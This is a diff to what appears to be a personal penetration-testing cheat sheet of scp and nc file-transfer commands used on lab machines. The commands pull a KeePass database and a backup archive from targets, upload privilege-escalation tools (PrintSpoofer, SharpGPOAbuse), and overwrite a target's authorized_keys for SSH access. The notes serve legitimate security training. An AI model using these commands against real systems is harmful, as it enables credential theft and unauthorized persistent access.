@@ -133,6 +133,7 @@ nc 192.168.45.171 4444 > nc.exe
 
 ##### Downloading 
 
+Linux 
 ```
 scp lnorgaard@keeper.htb:/home/lnorgaard/passcodes.kdbx .
 ```
@@ -141,11 +142,34 @@ scp lnorgaard@keeper.htb:/home/lnorgaard/passcodes.kdbx .
 scp -P 80 jack@10.112.156.33:/home/jack/user.jpg .
 ```
 
+Windows
+
+Kerberos Auth (assuming you requested an ticket already)
+
+```
+export KRB5CCNAME=f.frizzle.ccache
+```
+
+```
+scp 'f.frizzle@frizz.htb:C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z' backup.7z
+```
+
 ##### Uploading
+
+Windows 
 
 ```
 scp PrintSpoofer64.exe david@target.ine.local:"C:\\Users\\david\\" --> e.G with ssh
 ```
+
+Kerberos Auth
+
+```
+scp -k SharpGPOAbuse.exe m.schoolbus@frizz.htb:/windows/temp/
+SharpGPOAbuse.exe
+```
+
+Linux
 
 ```
 scp -O /home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Sorcerer/home/max/.ssh/authorized_keys max@192.168.130.100:/home/max/.ssh/authorized_keys
